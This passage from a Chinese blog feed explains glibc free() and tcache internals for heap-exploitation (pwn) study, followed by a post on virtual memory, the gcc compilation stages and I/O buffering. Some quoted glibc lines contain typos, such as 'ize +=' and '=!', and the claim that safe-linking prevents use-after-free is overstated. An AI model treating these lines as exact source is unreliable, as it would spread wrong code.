fastbin_index(size);</span><br><span class="line">  fb = &amp;fastbin (av, idx);</span><br><span class="line">  <span class="comment">// Atomically link P to its fastbin: </span></span><br><span class="line">  <span class="comment">// P-&gt;FD = *FB; *FB = P;</span></span><br><span class="line">  mchunkptr old = *fb, old2;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    old2 = old;</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">  &#125; <span class="keyword">while</span> ((old = </span><br><span class="line">    catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码除了前面提到的CAS操作，还有两个点值得注意一下：</p><ul><li>使用free<em>perturb函数来改变一下所释放空间的原来内容，这个要在设置了glibc.malloc.perturb或者MALLOC_PERTURB</em>环境变量的时候才会起作用</li><li>PROTECT_PTR的底层原理实际上是一种safe-linking的安全机制，它利用了ASLR（地址空间布局随机化）中的随机性，可以很有效的防止UAF漏洞，这部分很有意思，黑客的入门题，以后有时间再专门写篇文章研究下，这里只简单提下</li></ul><p>如果chunk size不属于fast bin的范围，继续判断是不是由mmap分配产生，如果由mmap分配产生，则使用munmap_chunk这个函数来进行free，munmap_chunk的主要代码也一并列在了下面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 如果空间是由mmap分配的，则使用munmap_chunk释放</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// munmap_chunk的主要实现</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">munmap_chunk</span><span class="params">(mchunkptr p)</span> &#123;</span><br><span class="line">  <span class="comment">// GLRO是一个字符串连接宏，这里把dl_pagesize</span></span><br><span class="line">  <span class="comment">// 变成了_dl_pagesize，_dl_pagesize的值是4096</span></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  INTERNAL_SIZE_T size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> mem = (<span class="type">uintptr_t</span>)chunk2mem(p);</span><br><span class="line">  <span class="type">uintptr_t</span> block = (<span class="type">uintptr_t</span>)p - prev_size(p);</span><br><span class="line">  <span class="type">size_t</span> total_size = prev_size(p) + size;</span><br><span class="line">  <span class="comment">// 通过下面这个check可以发现，mmap分配的</span></span><br><span class="line">  <span class="comment">// 空间地址和大小都必须是pagesize的倍数</span></span><br><span class="line">  <span class="keyword">if</span> (((block | total_size) &amp; (pagesize - <span class="number">1</span>)) != <span class="number">0</span> ||</span><br><span class="line">      (!powerof2(mem &amp; (pagesize - <span class="number">1</span>))))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atomic_decrement(&amp;mp_.n_mmaps);</span><br><span class="line">  <span class="type">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 继续调用__munmap来进行释放，</span></span><br><span class="line">  <span class="comment">// 追踪代码可以看到是由_vm_deallocate释放的空间</span></span><br><span class="line">  __munmap((<span class="type">char</span> *)block, total_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个判断的原理很简单，都知道malloc的chunk header中有A、M、P 3个bit的flag，其中的M就是表示该chunk是不是由mmap系统调用产生，这个判断宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>如果chunk不是由mmap分配，先判断该chunk的prev chunk是不是free state，如果是的话，需要和prev chunk进行merge：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再判断next chunk是不是top chunk，是的话，重新设置top chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (nextchunk == av-&gt;top) &#123;</span><br><span class="line">  ize += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果next chunk不是top chunk，有两种情况，如果是free state的话，则继续merge，如果是allocated state的话，则改变其P(PREV_INUSE) flag，最后把要free的chunk放入unsorted bin中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  unlink_chunk (av, nextchunk);</span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">// not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">// been given one chance to be used in malloc.</span></span><br><span class="line">bck = unsorted_chunks(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">set_foot(p, size);</span><br></pre></td></tr></table></figure><p>最后还要看下merge过后的chunk size是否达到FASTBIN_CONSOLIDATION_THRESHOLD这个阈值（默认大小是65536），达到的话要做一次malloc_consolidate操作（free fast bin中的chunk到unsorted bin中），对非main arena还要做一下heap_trim操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">  <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">  <span class="keyword">if</span> (av =!&amp;main_arena) &#123;</span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中的heap_for_ptr这个宏是用来得到当前heap的heap_info的，从它的定义可以验证heap_info这个数据结构的一些特性，值得看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr)                      \</span></span><br><span class="line"><span class="meta">  ((heap_info *)((unsigned long)(ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><h1 id="有tcache"><a href="#有tcache" class="headerlink" title="有tcache"></a>有tcache</h1><p>以上都是不考虑tcache的情况（libc&lt;2.26)，有tcache其实变化也并不是太大。</p><p>相关数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>tcache也是使用 类似 bins 方式来管理tcache 。</p><p><strong>tcache_perthread_struct是整个tcache</strong></p><p>每一项由 相同大小的 chunk 通过 tcache_entry 使用单向链表链接（类似于fastbin的链接方式）。</p><p><strong>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</strong></p><p>tcache_entry 用于链接 chunk 的结构体， 其中就只有一个 next 指针，指向下一个相同大小的 chunk.,也就说明tcache链上的成员只记录了fd指针</p><p>tcache中chunk大小范围<strong>0x20-0x410</strong></p><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这段代码能更好地理解上面两个结构体.</p><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 chunk 放到 指定的 tcache-&gt;entries 里面去， tc_idx 通过 csize2tidx (nb) 计算得到 （nb是 chunk 的大小）。</p><p>它首先把 chunk+2<em>SIZE_SZ （就是除去 header 部分） 强制转换成 tcache_entry </em> 类型，e指针也就指向了mem,然后修改mem的头字段(现在被视为entery的next指针)为之前的该entery的第一个chunk,然后再把entery的值改为e指针,最后把 tcache-&gt;counts[tc_idx] 加 1 ，表示新增了一个 chunk 到 该 表项。</p><p>tcache内的chunk不写该AMP三位,chunk之间不进行合并,且放入tcache的chunk哪怕与topchunk相邻也不会进行合并</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>简单来说就是put的逆操作,不多说.</p><p><strong>得到tc_idx的宏定义</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br></pre></td></tr></table></figure><h2 id="基本工作"><a href="#基本工作" class="headerlink" title="基本工作"></a>基本工作</h2><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <strong>tcache_perthread_struct</strong> 。</li><li>单链表tcache_entry，也即tcache Bin的默认最大数量是<strong>64</strong>，在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是0x20-0x410，也就是说我们必须要malloc size≤0x408的chunk</li><li><p>free 内存，且 size 小于 small bin size 时</p><ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）（<strong>p位不置零故不合并</strong>）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li><p>先从 tcache 取 chunk，直到 tcache 为空</p></li><li><p>tcache 为空后，从 bin 中找</p></li><li><p>tcache 为空时，如果 <strong>fastbin/smallbin/unsorted bin</strong>中有 size 符合的 chunk，会先把 <strong>fastbin/smallbin/unsorted bin</strong> 中的其他chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</p></li><li>上一条第三点详细说<ul><li>如果从 fastbin 中成功返回了一个需要的 chunk，那么对应 fastbin 中的其他 chunk 会被放进相应的 tcache bin 中，直到上限。需要注意的是 chunks 在 tcache bin 的顺序和在 fastbin 中的顺序是反过来的。</li><li>smallbin 中的情况与 fastbin 相似，双链表中的剩余 chunk 会被填充到 tcache bin 中，直到上限。</li><li>binning code（chunk合并等其他情况）中，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。寻找结束后，tcache 会返回其中一个。</li></ul></li></ul><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>这篇文章较上一篇更多东西是缝上去的,归纳整理的成分更多,自己总结的少一点。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础杂烩</title>
      <link href="/posts/32771/"/>
      <url>/posts/32771/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习过程中发现自己对一些计算机系统的基础知识并不了解，目前暂时也没有精力去系统的学习，于是就将经常遇到的又不懂的知识归纳一下</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="虚拟地址与物理地址之间的映射"><a href="#虚拟地址与物理地址之间的映射" class="headerlink" title="虚拟地址与物理地址之间的映射"></a>虚拟地址与物理地址之间的映射</h2><p>先看一下进程虚拟地址空间的总体布局，以32位Linux系统为例：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_152459.png" alt=""></p><p>基于上图的虚拟地址空间布局来简单说下ELF文件是怎样映射到进程虚拟地址空间的，ELF文件被组织成如下图左列出的一系列section，其中具有相同属性（R/W/E）的section再组成一个segment，以segment为单位映射到进程的虚拟地址空间，其中虚拟地址空间中的segment要做到页大小对齐，下图也一同简要展示了虚拟地址空间到物理地址空间的映射，通过MMU完成。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_152545.png" alt=""></p><p>其它系统原理类似，都是将可执行程序组织成若干segment连同用到的动态库和kernel映射到进程的虚拟地址空间，主要差别在于不同segment映射的起始地址、大小不同等，比如32位Linux系统的Text segment起址是0x08048000，64位Linux系统的Text segment起址是0x00400000，再比如相对32位Linux系统的kernel space是1G，32位Windows的kernel space是2G等等。</p><h2 id="main函数参数"><a href="#main函数参数" class="headerlink" title="main函数参数"></a>main函数参数</h2><p>学c语言时有没有学过忘了，反正我不会，了解一下</p><ul><li><p>int argc：这个东西是所有参数的个数，包括文件名</p></li><li><p>char* argv[]：这个东西里面，argv[]是argc个参数，其中第0个参数即argv[0]是程序的全名，后面跟着的就是用户输入的参数了</p></li><li>char* envp[]：这个东西用来取得系统的环境变量，envp保存了系统所有的环境变量路径</li></ul><h2 id="从源代码到可执行文件"><a href="#从源代码到可执行文件" class="headerlink" title="从源代码到可执行文件"></a>从源代码到可执行文件</h2><p>过程可分为4个步骤：预处理（Preprocessing）、编译（Compilation）、汇编（Assembly）和链接（Linking）。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-26_110757.png" alt=""></p><p>以hello word 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">&quot;hello.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">printf</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__restrict __format, ...)</span>;</span><br><span class="line">......</span><br><span class="line">main() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预编译过程主要处理源代码中以 “#” 开始的预编译指令：</p><ul><li>将所有的 “#define” 删除，并且展开所有的宏定义。</li><li>处理所有条件预编译指令，如 “#if”、“#ifdef”、“#elif”、“#else”、“#endif”。</li><li>处理 “#include” 预编译指令，将被包含的文件插入到该预编译指令的位置。注意，该过程递归执行。</li><li>删除所有注释。</li><li>添加行号和文件名标号。</li><li>保留所有的 #pragma 编译器指令。</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">        .file   &quot;hello.c&quot;</span><br><span class="line">        .section        .rodata</span><br><span class="line">.LC0:</span><br><span class="line">        .string &quot;hello, world&quot;</span><br><span class="line">        .text</span><br><span class="line">        .globl  main</span><br><span class="line">        .type   main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset 6, -16</span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register 6</span><br><span class="line">        leaq    .LC0(%rip), %rdi</span><br><span class="line">        call    puts@PLT</span><br><span class="line">        movl    $0, %eax</span><br><span class="line">        popq    %rbp</span><br><span class="line">        .cfi_def_cfa 7, 8</span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">        .size   main, .-main</span><br><span class="line">        .ident  &quot;GCC: (GNU) 7.2.0&quot;</span><br><span class="line">        .section        .note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><p>编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生成相应的汇编代码文件。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c hello.s -o hello.o</span><br><span class="line">或者</span><br><span class="line">$gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -sd hello.o</span><br><span class="line"></span><br><span class="line">hello.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 554889e5 488d3d00 000000e8 00000000  UH..H.=.........</span><br><span class="line"> 0010 b8000000 005dc3                      .....].</span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 68656c6c 6f2c2077 6f726c64 00        hello, world.</span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202847 4e552920 372e322e  .GCC: (GNU) 7.2.</span><br><span class="line"> 0010 3000                                 0.</span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span><br><span class="line"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 17000000 00410e10 8602430d  .........A....C.</span><br><span class="line"> 0030 06520c07 08000000                    .R......</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:   55                      push   %rbp</span><br><span class="line">   1:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">   4:   48 8d 3d 00 00 00 00    lea    0x0(%rip),%rdi        # b &lt;main+0xb&gt;</span><br><span class="line">   b:   e8 00 00 00 00          callq  10 &lt;main+0x10&gt;</span><br><span class="line">  10:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  15:   5d                      pop    %rbp</span><br><span class="line">  16:   c3                      retq</span><br></pre></td></tr></table></figure><p>汇编器将汇编代码转变成机器可以执行的指令。</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -j .text hello</span><br><span class="line">......</span><br><span class="line">000000000000064a &lt;main&gt;:</span><br><span class="line"> 64a:   55                      push   %rbp</span><br><span class="line"> 64b:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line"> 64e:   48 8d 3d 9f 00 00 00    lea    0x9f(%rip),%rdi        # 6f4 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line"> 655:   e8 d6 fe ff ff          callq  530 &lt;puts@plt&gt;</span><br><span class="line"> 65a:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 65f:   5d                      pop    %rbp</span><br><span class="line"> 660:   c3                      retq</span><br><span class="line"> 661:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line"> 668:   00 00 00</span><br><span class="line"> 66b:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>目标文件需要链接一大堆文件才能得到最终的可执行文件（上面只展示了链接后的 main 函数，可以和 hello.o 中的 main 函数作对比）。链接过程主要包括地址和空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定向（Relocation）等。</p><h2 id="流与缓冲"><a href="#流与缓冲" class="headerlink" title="流与缓冲"></a>流与缓冲</h2><h3 id="缓冲区是啥"><a href="#缓冲区是啥" class="headerlink" title="缓冲区是啥"></a>缓冲区是啥</h3><p>缓冲区是计算机中用于存储数据的一段内存区域，它可以用于临时存储输入或输出的数据，以提高计算机的性能。<strong>在输入/输出操作中，缓冲区通常用于临时存储待读取或待写入的数据</strong>。</p><p>在标准C库中，对于文件流，缓冲区是由库管理的一个内存区域，用于存储读写数据时的临时数据。<strong>输入缓冲区用于缓存从文件中读取的数据，输出缓冲区用于缓存将要写入文件的数据</strong>。缓冲区的作用是将多个小数据块合并成一个大数据块进行读写，从而提高输入输出效率。</p><p>缓冲区的大小通常是可配置的，并且可以根据实际需求进行调整。较小的缓冲区可以提高输入输出的实时性，但可能会导致读写速度较慢。较大的缓冲区可以提高输入输出的速度，但会消耗更多的内存空间。因此，在实际应用中，需要根据具体场景和需求来选择合适的缓冲区大小。</p><h3 id="输出流与输入流和错误流"><a href="#输出流与输入流和错误流" class="headerlink" title="输出流与输入流和错误流"></a>输出流与输入流和错误流</h3><p><strong>输入流</strong>通常与输入设备相对应，例如键盘、鼠标、触摸屏等。程序可以从输入流中读取数据，以便对数据进行处理和分析。在 C 语言中，标准输入流 stdin 就是一种输入流，程序可以使用各种输入函数（如 